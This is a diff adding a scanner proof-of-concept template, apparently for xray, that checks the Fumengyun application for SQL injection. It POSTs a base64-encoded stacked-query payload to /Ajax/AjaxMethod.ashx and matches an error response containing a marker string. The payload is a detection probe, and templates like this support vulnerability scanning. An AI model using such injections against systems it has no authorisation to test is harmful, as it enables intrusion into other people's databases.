@@ -1,0 +1,12 @@
+name: poc-yaml-fumengyun-sqli
+rules:
+  - method: POST
+    path: /Ajax/AjaxMethod.ashx
+    body: >-
+      action=getEmpByname&Name=YWRtaW4nO2RlY2xhcmUgQGEgbnZhcmNoYXIoMjAwMCkgc2V0IEBhPSdzZWxlY3QgY29udmVydChpbnQsMUFCQzJERUYzKScgZXhlYyhAYSkgLS0=
+    follow_redirects: false
+    expression: |2
+       response.status == 500 && response.body.bcontains(b'1ABC2DEF3')
+detail:
+  Author: qidian
+  links: https://www.yuque.com/qiqiqiqiqi-9vk6f/gd164g/nc966u
